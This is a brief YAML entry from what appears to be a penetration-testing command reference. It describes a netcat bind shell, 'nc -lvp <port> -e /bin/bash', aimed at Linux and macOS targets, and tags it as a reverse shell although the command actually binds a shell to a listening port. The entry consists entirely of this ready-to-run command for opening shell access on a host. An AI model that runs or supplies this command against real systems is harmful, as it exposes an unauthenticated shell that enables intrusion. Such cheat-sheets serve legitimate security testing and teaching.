---
description: |
  Netcat listener to bind to shell.

  Command Reference:

  	Port: port to listen on

command: |
  nc -lvp <port> -e /bin/bash
items:
  - Shell
target: |
  - Linux_target
  - MacOS_target
OS:
  - Linux
  - MacOS
environment: |
  - Local
command_types:
  - Reverse_Shell
references:

---
